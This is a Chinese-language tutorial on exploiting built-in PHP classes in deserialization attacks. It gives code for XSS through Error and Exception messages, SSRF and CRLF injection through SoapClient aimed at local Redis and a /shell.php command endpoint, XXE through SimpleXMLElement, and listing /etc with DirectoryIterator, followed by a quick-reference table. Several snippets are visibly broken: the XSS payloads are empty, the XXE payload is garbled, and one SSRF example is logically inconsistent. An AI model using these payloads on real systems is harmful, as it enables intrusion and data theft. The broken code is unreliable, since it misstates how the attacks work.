PHP 原生类利用

为什么要利用原生类？

即使服务端没有自定义可利用的类，也可以通过PHP内置的原生类触发漏洞。 这些原生类实现了各种魔术方法，当满足特定条件时可以触发危险操作。

Error/Exception 类 - XSS利用

触发条件

Error 和 Exception 类实现了 __toString() 方法。 当它们被当作字符串输出时（如 echo $e），会返回 $e->message。

如果message内容包含恶意JavaScript代码，可以触发XSS。

PHP代码


// 创建Error对象，设置message
$e = new Error("");

// 当echo或字符串拼接时会触发__toString
echo $e;
// 输出: 

// 字符串拼接也会触发
$str = "Error: " . $e;

反序列化利用


// 如果存在反序列化入口：
// unserialize($_POST['data'])

// 构造XSS payload
$payload = serialize(
    new Error("")
);

// POST提交后，如果输出点有echo
// 就会触发XSS
echo $_POST['data'];

Exception 类（类似）


// Exception 同样有 __toString()
$e = new Exception("");
echo $e;
// XSS payload 会被执行

SoapClient 类 - SSRF + CRLF注入

触发条件

SoapClient 类实现了 __call() 方法。 当调用不存在的方法时，会向 $location 属性指定的URL发送HTTP请求。

基本用法


// 创建SoapClient，指向目标URL
$client = new SoapClient(
    null,
    ['location' => 'http://target.com/api',
     'uri'      => 'test',
     'user_agent' => 'Mozilla']
);

// 调用不存在的方法触发__call
// 会向 location 发送HTTP请求
$client->notExistsMethod();

SSRF利用


// 反序列化入口时，可以指定location
$target = 'http://127.0.0.1:6379/';  // Redis地址

$client = new SoapClient(null, [
    'location' => $target,
    'uri' => 'test'
]);

// 序列化后POST提交
unserialize($_POST['data']);

// 调用任意不存在的方法触发SSRF
$client->hack();

CRLF 注入 - 添加任意Header

通过在 user_agent 中添加 \r\n，可以在HTTP请求中添加任意Header，甚至构造POST请求！

构造CRLF Payload


// user_agent 中包含 \r\n 可以换行
$payload = "Mozilla/5.0\r\n"
    . "Content-Type: application/json\r\n"
    . "X-Custom: injected\r\n"
    . "\r\n"
    . '{"cmd":"whoami"}';

$client = new SoapClient(null, [
    'location' => 'http://target.com/api',
    'uri' => 'test',
    'user_agent' => $payload
]);

// 实际发送的请求会包含注入的Header和Body
$client->method();

发送POST请求示例


// 完整利用示例
$client = new SoapClient(null, [
    'location' => 'http://127.0.0.1:8888/cmd',
    'uri' => 'test',
    'user_agent' => "test\r\n\r\nPOST /shell.php HTTP/1.1\r\n"
                    . "Host: localhost\r\n"
                    . "Content-Type: application/x-www-form-urlencoded\r\n"
                    . "Content-Length: 30\r\n"
                    . "\r\n"
                    . "cmd=whoami"
]);

$client->method();

SimpleXMLElement 类 - XXE

触发条件

SimpleXMLElement 类的构造函数可以解析XML。 如果允许加载外部实体，可以触发XXE攻击。

XXE利用


// 构造XXE payload
$xxe = '

]>
&xxe;';

$xml = new SimpleXMLElement($xxe);

// 输出XML（可能触发外部实体）
echo $xml->asXML();

反序列化利用


// 如果存在反序列化入口
$payload = serialize(
    new SimpleXMLElement($xxe, LIBXML_NOENT)
);

// 提交后会解析XML，执行外部实体
unserialize($_POST['data']);

DirectoryIterator 类 - 目录遍历

DirectoryIterator 类会遍历目录，当被当作字符串输出时会调用 __toString()。 


// 遍历当前目录
$dir = new DirectoryIterator(".");
foreach ($dir as $file) {
    echo $file . "\n";
}

// __toString 在字符串拼接时触发
$dir = new DirectoryIterator("/etc");
echo "Files: " . $dir;

常用原生类速查表

类名 触发魔术方法 可利用场景
Error / Exception __toString() XSS（输出message内容）
SoapClient __call() SSRF、CRLF注入（HTTP请求）

DirectoryIterator __toString() 目录遍历、信息泄露
SplFileObject __call() 任意文件读取
ZipArchive 构造方法 文件写入（open后addFile）
DOMDocument 构造方法 XEE、文件读取
